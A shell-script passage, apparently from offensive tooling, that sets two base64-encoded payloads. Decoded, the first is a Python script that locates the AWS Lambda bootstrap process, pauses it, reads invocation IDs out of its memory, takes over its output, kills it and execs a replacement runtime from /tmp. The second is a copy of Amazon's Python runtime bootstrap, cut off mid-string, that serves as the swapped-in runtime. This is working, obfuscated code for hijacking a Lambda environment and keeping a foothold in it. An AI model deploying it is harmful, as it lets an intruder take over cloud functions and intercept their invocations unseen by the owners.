; switch_runtime_b64="IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMyAKaW1wb3J0IG9zCmltcG9ydCByZQppbXBvcnQgc3lzCgpERUZBVUxUX1JVTlRJTUVfUEFUSCA9ICIvdG1wL3J1bnRpbWUiCklOVk9LRV9SRUdFWCA9IGInKFswLTlhLXpdezh9LVswLTlhLXpdezR9LVswLTlhLXpdezR9LVswLTlhLXpdezR9LVswLTlhLXpdezEyfSknCklOVk9LRV9NSU5fTEVOID0gMzYKCkRFRkFVTFRfTUFYX01FTSA9ICAxMjggKiAxMDI0ICogMTAyNCAgIyAxMjhNQiwgdGhlIG1pbiBsYW1iZGEgbWVtb3J5IGxpbWl0CmlmICJBV1NfTEFNQkRBX0ZVTkNUSU9OX01FTU9SWV9TSVpFIiBpbiBvcy5lbnZpcm9uOgogICAgbGFtYmRhX2xpbWl0ID0gaW50KG9zLmVudmlyb25bIkFXU19MQU1CREFfRlVOQ1RJT05fTUVNT1JZX1NJWkUiXSkgLyAxMAogICAgbGFtYmRhX2xpbWl0ID0gbGFtYmRhX2xpbWl0ICogMTAyNCAqIDEwMjQgICMgdG8gTUIKZWxzZToKICAgIGxhbWJkYV9saW1pdCA9IERFRkFVTFRfTUFYX01FTQpNQVhfTUVNID0gaW50KDAuOCAqIGxhbWJkYV9saW1pdCkgIyA4MCUgb2YgbWVtb3J5IGxpbWl0CgpTVERPVVRfRklMRU5PID0gMQpTVERFUlJfRklMRU5PID0gMgoKZGVmIG1haW4oKToKICAgIHBpZCA9IG9zLnBvcGVuKCJwZ3JlcCAtZm4gJ3B5dGhvbi4qYm9vdHN0cmFwJyIpLnJlYWQoKQogICAgaWYgKG5vdCBwaWQpIG9yIChub3QgcGlkLnJzdHJpcCgpLmlzZGlnaXQoKSk6CiAgICAgICAgIyBNYXliZSB3ZSBhbHJlYWR5IHN3aXRjaGVkIGl0LCBsZXQncyB0cnkgdG8gc3dpdGNoIGFnYWluCiAgICAgICAgcHJpbnQoIlshXSBDb3VsZG4ndCBmaW5kIHRoZSBib290c3RyYXAgcHJvY2VzcywgY2hlY2tpbmcgaWYgd2UgYWxyZWFkeSBzd2l0Y2hlZCBpdC4uLiIpCiAgICAgICAgcGlkID0gb3MucG9wZW4oInBncmVwIC1mbiAne30nIi5mb3JtYXQoREVGQVVMVF9SVU5USU1FX1BBVEgpKS5yZWFkKCkgCiAgICAgICAgaWYgKG5vdCBwaWQpIG9yIChub3QgcGlkLnJzdHJpcCgpLmlzZGlnaXQoKSk6CiAgICAgICAgICAgIHByaW50KCJbIV0gQ291bGRuJ3QgZmluZCB0aGUgYm9vdHN0cmFwIHByb2Nlc3Mgb3Igb3VyIG5ldyBydW50aW1lLCAiICsgXAogICAgICAgICAgICAgICAgICAibWF5YmUgc29tZW9uZSBlbHNlIGFscmVhZHkgc3dpdGNoZWQgdGhlIHJ1bnRpbWU/IChvciBBV1MgY2hhbmdlZCB0aGUgYXJjaGl0ZWN0dXJlKSIpCiAgICAgICAgICAgIHJldHVybgoKICAgIHBpZCA9IHBpZC5yc3RyaXAoKQogICAgc2lnbmFsX3Byb2Nlc3MoIlNUT1AiLCBwaWQpCgogICAgcG9zc2libGVfaW52b2tlX2lkcyA9IGV4dHJhY3RfaW52b2tlX2lkKHBpZCkKICAgIGlmIGxlbihwb3NzaWJsZV9pbnZva2VfaWRzKSA9PSAwOgogICAgICAgIHByaW50KCJbIV0gRmFpbGVkIHRvIGV4dHJhY3QgaW52b2tlIGlkIikKICAgICAgICBzaWduYWxfcHJvY2VzcygiQ09OVCIsIHBpZCkKICAgICAgICByZXR1cm4KCiAgICBjb3B5X3N0ZG91dF9zdGRlcnIocGlkKQogICAgc2lnbmFsX3Byb2Nlc3MoImtpbGwiLCBwaWQpCgogICAgbmV3X3J1bnRpbWVfcGF0aCA9IERFRkFVTFRfUlVOVElNRV9QQVRICiAgICBvcy5jaG1vZChuZXdfcnVudGltZV9wYXRoLCAwbzc3NykKICAgIGFyZ3MgPSBbbmV3X3J1bnRpbWVfcGF0aF0gKyBwb3NzaWJsZV9pbnZva2VfaWRzCiAgICBvcy5leGVjdihuZXdfcnVudGltZV9wYXRoLCBhcmdzKQoKIyBTZW5kcyBzaWduYWwgdG8gcHJvY2VzcwpkZWYgc2lnbmFsX3Byb2Nlc3Moc2lnbmFsLCBwaWQpOgogICAgY21kID0gImtpbGwgLXt9IHt9Ii5mb3JtYXQoc2lnbmFsLCBwaWQpCiAgICBvcy5wb3BlbihjbWQpLnJlYWQoKQoKCmRlZiBleHRyYWN0X2ludm9rZV9pZChwaWQpOgogICAgbWF0Y2hlcyA9IFtdCgogICAgIyBhY2Nlc3MgcHJvY2VzcyBtZW1vcnkKICAgIG1hcHNfZmlsZSA9IG9wZW4oIi9wcm9jL3t9L21hcHMiLmZvcm1hdChwaWQpLCAncicpCiAgICBtZW1fZmlsZSA9IG9wZW4oIi9wcm9jL3t9L21lbSIuZm9ybWF0KHBpZCksICdyYicsIDApCgogICAgbWFwcyA9IG1hcHNfZmlsZS5yZWFkbGluZXMoKQogICAgZm9yIG1hcF9saW5lIGluIG1hcHM6CiAgICAgICAgIyBXZSBuZWVkIGxvb2tpbmcgZm9yIGEgZHluYW1pYyB2YWx1ZSwgc2hvdWxkIHJlc2lkZSBpbiBhIHJlYWQgd3JpdGUgbWVtb3J5IHJlZ2lvbgogICAgICAgIG0gPSByZS5tYXRjaChyJyhbMC05QS1GYS1mXSspLShbMC05QS1GYS1mXSspIHJ3JywgbWFwX2xpbmUpCiAgICAgICAgaWYgbSA9PSBOb25lOgogICAgICAgICAgICBjb250aW51ZQogICAgICAgIG1lbV9zdGFydCA9IGludChtLmdyb3VwKDEpLCAxNikKICAgICAgICBtZW1fZW5kID0gaW50KG0uZ3JvdXAoMiksIDE2KSAKICAgICAgICBtZW1fbGVuID0gbWVtX2VuZCAtIG1lbV9zdGFydAogICAgICAgIGlmIG1lbV9sZW4gPiBNQVhfTUVNOgogICAgICAgICAgICBjb250aW51ZQogICAgICAgIHRyeToKICAgICAgICAgICAgbWVtX2ZpbGUuc2VlayhtZW1fc3RhcnQpICAjIHNlZWsgdG8gcmVnaW9uIHN0YXJ0CiAgICAgICAgICAgIG1lbV9jaHVuayA9IG1lbV9maWxlLnJlYWQobWVtX2xlbikgICMgcmVhZCByZWdpb24gY29udGVudHMKICAgICAgICBleGNlcHQgKE9TRXJyb3IgLElPRXJyb3IsIE92ZXJmbG93RXJyb3IpOgogICAgICAgICAgICBjb250aW51ZQogICAgICAgIG1hdGNoZXMgKz0gcGFyc2VfbWF0Y2hlc19mcm9tX2NodW5rKG1lbV9jaHVuaykKCiAgICByZXR1cm4gbGlzdChzZXQobWF0Y2hlcykpCgpkZWYgcGFyc2VfbWF0Y2hlc19mcm9tX2NodW5rKGNodW5rKToKICAgIGlmIGxlbihjaHVuaykgPCBJTlZPS0VfTUlOX0xFTjoKICAgICAgICByZXR1cm4gW10KCiAgICBtYXRjaGVzID0gW10KCiAgICBmb3IgbSBpbiByZS5maW5kaXRlcihJTlZPS0VfUkVHRVgsIGNodW5rKToKICAgICAgICBmb3VuZF9pbnZva2VfaWQgPSBtLmdyb3VwKDEpCiAgICAgICAgbWF0Y2hlcy5hcHBlbmQoc3RyKGZvdW5kX2ludm9rZV9pZCwgImFzY2lpIikpCgogICAgcmV0dXJuIG1hdGNoZXMKCgpkZWYgY29weV9zdGRvdXRfc3RkZXJyKHBpZCk6CiAgICBwYXRoID0gIi9wcm9jL3t9L2ZkLzEiLmZvcm1hdChwaWQpCiAgICBib290c3RyYXBfc3Rkb3V0ID0gb3Mub3BlbihwYXRoLCBvcy5PX1dST05MWSkKICAgIG9zLmR1cDIoYm9vdHN0cmFwX3N0ZG91dCwgU1RET1VUX0ZJTEVOTykKICAgIG9zLmR1cDIoYm9vdHN0cmFwX3N0ZG91dCwgU1RERVJSX0ZJTEVOTykKCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgbWFpbigpCg==" ; new_runtime_b64="IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwoKIiIiCkNvcHlyaWdodCAoYykgMjAxOCBBbWF6b24uIEFsbCByaWdodHMgcmVzZXJ2ZWQuCiIiIgoKaW1wb3J0IGpzb24KaW1wb3J0IGxvZ2dpbmcKaW1wb3J0IG9zCmltcG9ydCBzaXRlCmltcG9ydCBzeXMKaW1wb3J0IHRpbWUKaW1wb3J0IHRyYWNlYmFjawppbXBvcnQgd2FybmluZ3MKCnN5cy5wYXRoLmluc2VydCgwLCAiL3Zhci9ydW50aW1lIikgIyBGb3IgbGFtYmRhIG1vZHVsZXMKCmZyb20gbGFtYmRhX3J1bnRpbWVfY2xpZW50IGltcG9ydCBMYW1iZGFSdW50aW1lQ2xpZW50CmZyb20gbGFtYmRhX3J1bnRpbWVfZXhjZXB0aW9uIGltcG9ydCBGYXVsdEV4Y2VwdGlvbgpmcm9tIGxhbWJkYV9ydW50aW1lX21hcnNoYWxsZXIgaW1wb3J0IHRvX2pzb24KCndpdGggd2FybmluZ3MuY2F0Y2hfd2FybmluZ3MoKToKICAgIHdhcm5pbmdzLmZpbHRlcndhcm5pbmdzKCJpZ25vcmUiLCBjYXRlZ29yeT1EZXByZWNhdGlvbldhcm5pbmcpCiAgICBpbXBvcnQgaW1wCgpFUlJPUl9MT0dfTElORV9URVJNSU5BVEUgPSAnXHInCkVSUk9SX0xPR19JREVOVCA9ICdcdTAwYTAnICAjIE5PLUJSRUFLIFNQQUNFIFUrMDBBMAoKCmRlZiBfZ2V0X2hhbmRsZXIoaGFuZGxlcik6CiAgICB0cnk6CiAgICAgICAgKG1vZG5hbWUsIGZuYW1lKSA9IGhhbmRsZXIucnNwbGl0KCcuJywgMSkKICAgIGV4Y2VwdCBWYWx1ZUVycm9yIGFzIGU6CiAgICAgICAgZmF1bHQgPSBGYXVsdEV4Y2VwdGlvbihGYXVsdEV4Y2VwdGlvbi5NQUxGT1JNRURfSEFORExFUl9OQU1FLCAiQmFkIGhhbmRsZXIgJ3t9Jzoge30iLmZvcm1hdChoYW5kbGVyLCBzdHIoZSkpKQogICAgICAgIHJldHVybiBtYWtlX2ZhdWx0X2hhbmRsZXIoZmF1bHQpCgogICAgZmlsZV9oYW5kbGUsIHBhdGhuYW1lLCBkZXNjID0gTm9uZSwgTm9uZSwgTm9uZQogICAgdHJ5OgogICAgICAgICMgUmVjdXJzaXZlbHkgbG9hZGluZyBoYW5kbGVyIGluIG5lc3RlZCBkaXJlY3RvcmllcwogICAgICAgIGZvciBzZWdtZW50IGluIG1vZG5hbWUuc3BsaXQoJy4nKToKICAgICAgICAgICAgaWYgcGF0aG5hbWUgaXMgbm90IE5vbmU6CiAgICAgICAgICAgICAgICBwYXRobmFtZSA9IFtwYXRobmFtZV0KICAgICAgICAgICAgZmlsZV9oYW5kbGUsIHBhdGhuYW1lLCBkZXNjID0gaW1wLmZpbmRfbW9kdWxlKHNlZ21lbnQsIHBhdGhuYW1lKQogICAgICAgIGlmIGZpbGVfaGFuZGxlIGlzIE5vbmU6CiAgICAgICAgICAgIG1vZHVsZV90eXBlID0gZGVzY1syXQogICAgICAgICAgICBpZiBtb2R1bGVfdHlwZSA9PSBpbXAuQ19CVUlMVElOOgogICAgICAgICAgICAgICAgZmF1bHQgPSBGYXVsdEV4Y2VwdGlvbihGYXVsdEV4Y2VwdGlvbi5CVUlMVF9JTl9NT0RVTEVfQ09ORkxJQ1QsICJDYW5ub3QgdXNlIGJ1aWx0LWluIG1vZHVsZSB7fSBhcyBhIGhhbmRsZXIgbW9kdWxlIi5mb3JtYXQobW9kbmFtZSkpCiAgICAgICAgICAgICAgICByZXF1ZXN0X2hhbmRsZXIgPSBtYWtlX2ZhdWx0X2hhbmRsZXIoZmF1bHQpCiAgICAgICAgICAgICAgICByZXR1cm4gcmVxdWVzdF9oYW5kbGVyCiAgICAgICAgbSA9IGltcC5sb2FkX21vZHVsZShtb2RuYW1lLCBmaWxlX2hhbmRsZSwgcGF0aG5hbWUsIGRlc2MpCiAgICBleGNlcHQgSW1wb3J0RXJyb3IgYXMgZToKICAgICAgICBmYXVsdCA9IEZhdWx0RXhjZXB0aW9uKEZhdWx0RXhjZXB0aW9uLklNUE9SVF9NT0RVTEVfRVJST1IsICJVbmFibGUgdG8gaW1wb3J0IG1vZHVsZSAne30nOiB7fSIuZm9ybWF0KG1vZG5hbWUsIHN0cihlKSkpCiAgICAgICAgcmVxdWVzdF9oYW5kbGVyID0gbWFrZV9mYXVsdF9oYW5kbGVyKGZhdWx0KQogICAgICAgIHJldHVybiByZXF1ZXN0X2hhbmRsZXIKICAgIGV4Y2VwdCBTeW50YXhFcnJvciBhcyBlOgogICAgICAgIHRyYWNlID0gIkZpbGUgXCIlc1wiIExpbmUgJXNcblx0JXMiICUgKGUuZmlsZW5hbWUsIGUubGluZW5vLCBlLnRleHQpCiAgICAgICAgZmF1bHQgPSBGYXVsdEV4Y2VwdGlvbihGYXVsdEV4Y2VwdGlvbi5VU0VSX0NPREVfU1lOVEFYX0VSUk9SLCAiU3ludGF4IGVycm9yIGluIG1vZHVsZSAne30nOiB7fSIuZm9ybWF0KG1vZG5hbWUsIHN0cihlKSksIHRyYWNlKQogICAgICAgIHJlcXVlc3RfaGFuZGxlciA9IG1ha2VfZmF1bHRfaGFuZGxlcihmYXVsdCkKICAgICAgICByZXR1cm4gcmVxdWVzdF9oYW5kbGVyCiAgICBmaW5hbGx5OgogICAgICAgIGlmIGZpbGVfaGFuZGxlIGlzIG5vdCBOb25lOgogICAgICAgICAgICBmaWxlX2hhbmRsZS5jbG9zZSgpCgogICAgdHJ5OgogICAgICAgIHJlcXVlc3RfaGFuZGxlciA9IGdldGF0dHIobSwgZm5hbWUpCiAgICBleGNlcHQgQXR0cmlidXRlRXJyb3I6CiAgICAgICAgZmF1bHQgPSBGYXVsdEV4Y2VwdGlvbihGYXVsdEV4Y2VwdGlvbi5IQU5ETEVSX05PVF9GT1VORCwgIkhhbmRsZXIgJ3t9JyBtaXNzaW5nIG9uIG1vZHVsZSAne30nIi5mb3JtYXQoZm5hbWUsIG1vZG5hbWUpLCBOb25lKQogICAgICAgIHJlcXVlc3RfaGFuZGxlciA9IG1ha2VfZmF1bHRfaGFuZGxlcihmYXVsdCkKICAgIHJldHVybiByZXF1ZXN0X2hhbmRsZXIKCgpkZWYgbWFrZV9mYXVsdF9oYW5kbGVyKGZhdWx0KToKICAgIGRlZiByZXN1bHQoKmFyZ3MpOgogICAgICAgIHJhaXNlIGZhdWx0CgogICAgcmV0dXJuIHJlc3VsdAoKCmRlZiBtYWtlX2Vycm9yKGVycm9yX21lc3NhZ2UsIGVycm9yX3R5cGUsIHN0YWNrX3RyYWNlKToKICAgIHJlc3VsdCA9IHt9CiAgICBpZiBlcnJvcl9tZXNzYWdlOgogICAgICAgIHJlc3VsdFsnZXJyb3JNZXNzYWdlJ10gPSBlcnJvcl9tZXNzYWdlCiAgICBpZiBlcnJvcl90eXBlOgogICAgICAgIHJlc3VsdFsnZXJyb3JUeXBlJ10gPSBlcnJvcl90eXBlCiAgICBpZiBzdGFja190cmFjZToKICAgICAgICByZXN1bHRbJ3N0YWNrVHJhY2UnXSA9IHN0YWNrX3RyYWNlCiAgICByZXR1cm4gcmVzdWx0CgoKZGVmIHJlcGxhY2VfbGluZV9pbmRlbnRhdGlvbihsaW5lLCBpbmRlbnRfY2hhciwgbmV3X2luZGVudF9jaGFyKToKICAgIGlkZW50X2NoYXJzX2NvdW50ID0gMAogICAgZm9yIGMgaW4gbGluZToKICAgICAgICBpZiBjICE9IGluZGVudF9jaGFyOgogICAgICAgICAgICBicmVhawogICAgICAgIGlkZW50X2NoYXJzX2NvdW50ICs9IDEKICAgIHJldHVybiAobmV3X2luZGVudF9jaGFyICogaWRlbnRfY2hhcnNfY291bnQpICsgbGluZVtpZGVudF9jaGFyc19jb3VudDpdCgoKZGVmIGxvZ19lcnJvcihlcnJvcl9yZXN1bHQpOgogICAgZXJyb3JfZGVzY3JpcHRpb24gPSAiW0VSUk9SXSIKCiAgICBlcnJvcl9yZXN1bHRfdHlwZSA9IGVycm9yX3Jlc3VsdC5nZXQoJ2Vycm9yVHlwZScpCiAgICBpZiBlcnJvcl9yZXN1bHRfdHlwZToKICAgICAgICBlcnJvcl9kZXNjcmlwdGlvbiArPSAiICIgKyBlcnJvcl9yZXN1bHRfdHlwZQoKICAgIGVycm9yX3Jlc3VsdF9tZXNzYWdlID0gZXJyb3JfcmVzdWx0LmdldCgnZXJyb3JNZXNzYWdlJykKICAgIGlmIGVycm9yX3Jlc3VsdF9tZXNzYWdlOgogICAgICAgIGlmIGVycm9yX3Jlc3VsdF90eXBlOgogICAgICAgICAgICBlcnJvcl9kZXNjcmlwdGlvbiArPSAiOiIKICAgICAgICBlcnJvcl9kZXNjcmlwdGlvbiArPSAiICIgKyBlcnJvcl9yZXN1bHRfbWVzc2FnZQoKICAgIGVycm9yX21lc3NhZ2VfbGluZXMgPSBbZXJyb3JfZGVzY3JpcHRpb25dCgogICAgc3RhY2tfdHJhY2UgPSBlcnJvcl9yZXN1bHQuZ2V0KCdzdGFja1RyYWNlJykKICAgIGlmIHN0YWNrX3RyYWNlIGlzIG5vdCBOb25lOgogICAgICAgIGVycm9yX21lc3NhZ2VfbGluZXMgKz0gWyJUcmFjZWJhY2sgKG1vc3QgcmVjZW50IGNhbGwgbGFzdCk6Il0KICAgICAgICBmb3IgdHJhY2VfZWxlbWVudCBpbiBzdGFja190cmFjZToKICAgICAgICAgICAgaWYgdHJhY2VfZWxlbWVudCA9PSAiIjoKICAgICAgICAgICAgICAgIGVycm9yX21lc3NhZ2VfbGluZXMgKz0gWyIiXQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgZm9yIHRyYWNlX2xpbmUgaW4gdHJhY2VfZWxlbWVudC5zcGxpdGxpbmVzKCk6CiAgICAgICAgICAgICAgICAgICAgZXJyb3JfbWVzc2FnZV9saW5lcyArPSBbcmVwbGFjZV9saW5lX2luZGVudGF0aW9uKHRyYWNlX2xpbmUsICcgJywgRVJST1JfTE9HX0lERU5UKV0KCiAgICBlcnJvcl9tZXNzYWdlID0gRVJST1JfTE9HX0xJTkVfVEVSTUlOQVRFLmpvaW4oZXJyb3JfbWVzc2FnZV9saW5lcykgKyAnXG4nCiAgICBzeXMuc3Rkb3V0LndyaXRlKGVycm9yX21lc3NhZ2UpCgoKCmRlZiBwYXJzZV9qc29uX2hlYWRlcihoZWFkZXIsIG5hbWUpOgogICAgdHJ5OgogICAgICAgIHJldHVybiBqc29uLmxvYWRzKGhlYWRlcikKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICByYWlzZSBGYXVsdEV4Y2VwdGlvbihGYXVsdEV4Y2VwdGlvbi5MQU1CREFfQ09OVEVYVF9VTk1BUlNIQUxfRVJST1IsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIlVuYWJsZSB0byBwYXJzZSB7fSBKU09OOiB7fSIuZm9ybWF0KG5hbWUsIHN0cihlKSksIE5vbmUpCgoKZGVmIGNyZWF0ZV9sYW1iZGFfY29udGV4dChjbGllbnRfY29udGV4dF9qc29uLCBjb2duaXRvX2lkZW50aXR5X2pzb24sIGVwb2NoX2RlYWRsaW5lX3RpbWVfaW5fbXMsIGludm9rZV9pZCwKICAgICAgICAgICAgICAgICAgICAgICAgICBpbnZva2VkX2Z1bmN0aW9uX2Fybik6CiAgICBjbGllbnRfY29udGV4dCA9IE5vbmUKICAgIGlmIGNsaWVudF9jb250ZXh0X2pzb246CiAgICAgICAgY2xpZW50X2NvbnRleHQgPSBwYXJzZV9qc29uX2hlYWRlcihjbGllbnRfY29udGV4dF9qc29uLCAiQ2xpZW50IENvbnRleHQiKQogICAgY29nbml0b19pZGVudGl0eSA9IE5vbmUKICAgIGlmIGNvZ25pdG9faWRlbnRpdHlfanNvbjoKICAgICAgICBjb2duaXRvX2lkZW50aXR5ID0gcGFyc2VfanNvbl9oZWFkZXIoY29nbml0b19pZGVudGl0eV9qc29uLCAiQ29nbml0byBJZGVudGl0eSIpCiAgICByZXR1cm4gTGFtYmRhQ29udGV4dChpbnZva2VfaWQsIGNsaWVudF9jb250ZXh0LCBjb2duaXRvX2lkZW50aXR5LCBlcG9jaF9kZWFkbGluZV90aW1lX2luX21zLAogICAgICAgICAgICAgICAgICAgICAgICAgaW52b2tlZF9mdW5jdGlvbl9hcm4pCgoKZGVmIGJ1aWxkX2ZhdWx0X3Jlc3VsdChleGNfaW5mbywgbXNnKToKICAgIGV0eXBlLCB2YWx1ZSwgdGIgPSBleGNfaW5mbwogICAgdGJfdHVwbGVzID0gZXh0cmFjdF90cmFjZWJhY2sodGIpCiAgICBmb3IgaSBpbiByYW5nZShsZW4odGJfdHVwbGVzKSk6CiAgICAgICAgaWYgIi9ib290c3RyYXAucHkiIG5vdCBpbiB0Yl90dXBsZXNbaV1bMF06ICAjIGZpbGVuYW1lIG9mIHRoZSB0YiB0dXBsZQogICAgICAgICAgICB0Yl90dXBsZXMgPSB0Yl90dXBsZXNbaTpdCiAgICAgICAgICAgIGJyZWFrCgogICAgcmV0dXJuIG1ha2VfZXJyb3IobXNnIGlmIG1zZyBlbHNlIHN0cih2YWx1ZSksIGV0eXBlLl9fbmFtZV9fLCB0cmFjZWJhY2suZm9ybWF0X2xpc3QodGJfdHVwbGVzKSkKCgpkZWYgZXh0cmFjdF90cmFjZWJhY2sodGIpOgogICAgcmV0dXJuIFsoZnJhbWUuZmlsZW5hbWUsIGZyYW1lLmxpbmVubywgZnJhbWUubmFtZSwgZnJhbWUubGluZSkgZm9yIGZyYW1lIGluIHRyYWNlYmFjay5leHRyYWN0X3RiKHRiKV0KCgpjbGFzcyBDb2duaXRvSWRlbnRpdHkob2JqZWN0KToKICAgIF9fc2xvdHNfXyA9IFsiY29nbml0b19pZGVudGl0eV9pZCIsICJjb2duaXRvX2lkZW50aXR5X3Bvb2xfaWQiXQoKCmNsYXNzIENsaWVudChvYmplY3QpOgogICAgX19zbG90c19fID0gWyJpbnN0YWxsYXRpb25faWQiLCAiYXBwX3RpdGxlIiwgImFwcF92ZXJzaW9uX25hbWUiLCAiYXBwX3ZlcnNpb25fY29kZSIsICJhcHBfcGFja2FnZV9uYW1lIl0KCgpjbGFzcyBDbGllbnRDb250ZXh0KG9iamVjdCk6CiAgICBfX3Nsb3RzX18gPSBbJ2N1c3RvbScsICdlbnYnLCAnY2xpZW50J10KCgpkZWYgbWFrZV9vYmpfZnJvbV9kaWN0KF9jbGFzcywgX2RpY3QsIGZpZWxkcz1Ob25lKToKICAgIGlmIF9kaWN0IGlzIE5vbmU6CiAgICAgICAgcmV0dXJuIE5vbmUKICAgIG9iaiA9IF9jbGFzcygpCiAgICBzZXRfb2JqX2Zyb21fZGljdChvYmosIF9kaWN0KQogICAgcmV0dXJuIG9iagoKCmRlZiBzZXRfb2JqX2Zyb21fZGljdChvYmosIF9kaWN0LCBmaWVsZHM9Tm9uZSk6CiAgICBpZiBmaWVsZHMgaXMgTm9uZToKICAgICAgICBmaWVsZHMgPSBvYmouX19jbGFzc19fLl9fc2xvdHNfXwogICAgZm9yIGZpZWxkIGluIGZpZWxkczoKICAgICAgICBzZXRhdHRyKG9iaiwgZmllbGQsIF9kaWN0LmdldChmaWVsZCwgTm9uZSkpCgoKY2xhc3MgTGFtYmRhQ29udGV4dChvYmplY3QpOgogICAgZGVmIF9faW5pdF9fKHNlbGYsIGludm9rZV9pZCwgY2xpZW50X2NvbnRleHQsIGNvZ25pdG9faWRlbnRpdHksIGVwb2NoX2RlYWRsaW5lX3RpbWVfaW5fbXMsCiAgICAgICAgICAgICAgICAgaW52b2tlZF9mdW5jdGlvbl9hcm49Tm9uZSk6CiAgICAgICAgc2VsZi5hd3NfcmVxdWVzdF9pZCA9IGludm9rZV9pZAogICAgICAgIHNlbGYubG9nX2dyb3VwX25hbWUgPSBvcy5lbnZpcm9uLmdldCgnQVdTX0xBTUJEQV9MT0dfR1JPVVBfTkFNRScpCiAgICAgICAgc2VsZi5sb2dfc3RyZWFtX25hbWUgPSBvcy5lbnZpcm9uLmdldCgnQVdTX0xBTUJEQV9MT0dfU1RSRUFNX05BTUUnKQogICAgICAgIHNlbGYuZnVuY3Rpb25fbmFtZSA9IG9zLmVudmlyb24uZ2V0KCJBV1NfTEFNQkRBX0ZVTkNUSU9OX05BTUUiKQogICAgICAgIHNlbGYubWVtb3J5X2xpbWl0X2luX21iID0gb3MuZW52aXJvbi5nZXQoJ0FXU19MQU1CREFfRlVOQ1RJT05fTUVNT1JZX1NJWkUnKQogICAgICAgIHNlbGYuZnVuY3Rpb25fdmVyc2lvbiA9IG9zLmVudmlyb24uZ2V0KCdBV1NfTEFNQkRBX0ZVTkNUSU9OX1ZFUlNJT04nKQogICAgICAgIHNlbGYuaW52b2tlZF9mdW5jdGlvbl9hcm4gPSBpbnZva2VkX2Z1bmN0aW9uX2FybgoKICAgICAgICBzZWxmLmNsaWVudF9jb250ZXh0ID0gbWFrZV9vYmpfZnJvbV9kaWN0KENsaWVudENvbnRleHQsIGNsaWVudF9jb250ZXh0KQogICAgICAgIGlmIHNlbGYuY2xpZW50X2NvbnRleHQgaXMgbm90IE5vbmU6CiAgICAgICAgICAgIHNlbGYuY2xpZW50X2NvbnRleHQuY2xpZW50ID0gbWFrZV9vYmpfZnJvbV9kaWN0KENsaWVudCwgc2VsZi5jbGllbnRfY29udGV4dC5jbGllbnQpCgogICAgICAgIHNlbGYuaWRlbnRpdHkgPSBtYWtlX29ial9mcm9tX2RpY3QoQ29nbml0b0lkZW50aXR5LCB7fSkKICAgICAgICBpZiBjb2duaXRvX2lkZW50aXR5IGlzIG5vdCBOb25lOgogICAgICAgICAgICBzZWxmLmlkZW50aXR5LmNvZ25pdG9faWRlbnRpdHlfaWQgPSBjb2duaXRvX2lkZW50aXR5LmdldCgiY29nbml0b0lkZW50aXR5SWQiKQogICAgICAgICAgICBzZWxmLmlkZW50aXR5LmNvZ25pdG9faWRlbnRpdHlfcG9vbF9pZCA9IGNvZ25pdG9faWRlbnRpdHkuZ2V0KCJjb2duaXRvSWRlbnRpdHlQb29sSWQiKQoKICAgICAgICBzZWxmLl9lcG9jaF9kZWFkbGluZV90aW1lX2luX21zID0gZXBvY2hfZGVhZGxpbmVfdGltZV9pbl9tcwoKICAgIGRlZiBnZXRfcmVtYWluaW5nX3RpbWVfaW5fbWlsbGlzKHNlbGYpOgogICAgICAgIGVwb2NoX25vd19pbl9tcyA9IGludCh0aW1lLnRpbWUoKSAqIDEwMDApCiAgICAgICAgZGVsdGFfbXMgPSBzZWxmLl9lcG9jaF9kZWFkbGluZV90aW1lX2luX21zIC0gZXBvY2hfbm93X2luX21zCiAgICAgICAgcmV0dXJuIGRlbHRhX21zIGlmIGRlbHRhX21zID4gMCBlbHNlIDAKCiAgICBkZWYgbG9nKHNlbGYsIG1zZyk6CiAgICAgICAgc3lzLnN0ZG91dC53cml0ZShzdHIobXNnKSkKCgpjbGFzcyBMYW1iZGFMb2dnZXJIYW5kbGVyKGxvZ2dpbmcuSGFuZGxlcik6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgbG9nZ2luZy5IYW5kbGVyLl9faW5pdF9fKHNlbGYpCgogICAgZGVmIGVtaXQoc2VsZiwgcmVjb3JkKToKICAgICAgICBtc2cgPSBzZWxmLmZvcm1hdChyZWNvcmQpCiAgICAgICAgcHJpbnQobXNnKQoKCmNsYXNzIExhbWJkYUxvZ2dlckZpbHRlcihsb2dnaW5nLkZpbHRlcik6CiAgICBkZWYgZmlsdGVyKHNlbGYsIHJlY29yZCk6CiAgICAgICAgcmVjb3JkLmF3c19yZXF1ZXN0X2lkID0gX0dMT0JBTF9BV1NfUkVRVUVTVF9JRCBvciAiIgogICAgICAgIHJldHVybiBUcnVlCgoKY2xhc3MgVW5idWZmZXJlZChvYmplY3QpOgogICAgZGVmIF9faW5pdF9fKHNlbGYsIHN0cmVhbSk6CiAgICAgICAgc2VsZi5zdHJlYW0gPSBzdHJlYW0KCiAgICBkZWYgX19nZXRhdHRyX18oc2VsZiwgYXR0cik6CiAgICAgICAgcmV0dXJuIGdldGF0dHIoc2VsZi5zdHJlYW0sIGF0dHIpCgogICAgZGVmIHdyaXRlKHNlbGYsIG1zZyk6CiAgICAgICAgc2VsZi5zdHJlYW0ud3JpdGUobXNnKQogICAgICAgIHNlbGYuc3RyZWFtLmZsdXNoKCkKCiAgICBkZWYgd3JpdGVsaW5lcyhzZWxmLCBtc2dzKToKICAgICAgICBzZWxmLnN0cmVhbS53cml0ZWxpbmVzKG1zZ3MpCiAgICAgICAgc2VsZi5zdHJlYW0uZmx1c2goKQoKCmRlZiBpc19weXRob25wYXRoX3NldCgpOgogICAgcmV0dXJuICJQWVRIT05QQVRIIiBpbiBvcy5lbnZpcm9uCgoKZGVmIGdldF9vcHRfc2l0ZV9wYWNrYWdlc19kaXJlY3RvcnkoKToKICAgIHJldHVybiAnL29wdC9weXRob24vbGliL3B5dGhvbnt9Lnt9L3NpdGUtcGFja2FnZXMnLmZvcm1hdChzeXMudmVyc2lvbl9pbmZvLm1ham9yLCBzeXMudmVyc2lvbl9pbmZvLm1pbm9yKQoKCmRlZiBnZXRfb3B0X3B5dGhvbl9kaXJlY3RvcnkoKToKICAgIHJldHVybiAnL29wdC9weXRob24nCgoKIyBzZXQgZGVmYXVsdCBzeXMucGF0aCBmb3IgZGlzY292ZXJhYmlsaXR5CiMgcHJlY2VkZW5jZTogL3Zhci90YXNrIC0+IC9vcHQvcHl0aG9uL2xpYi9weXRob25OLk4vc2l0ZS1wYWNrYWdlcyAtPiAvb3B0L3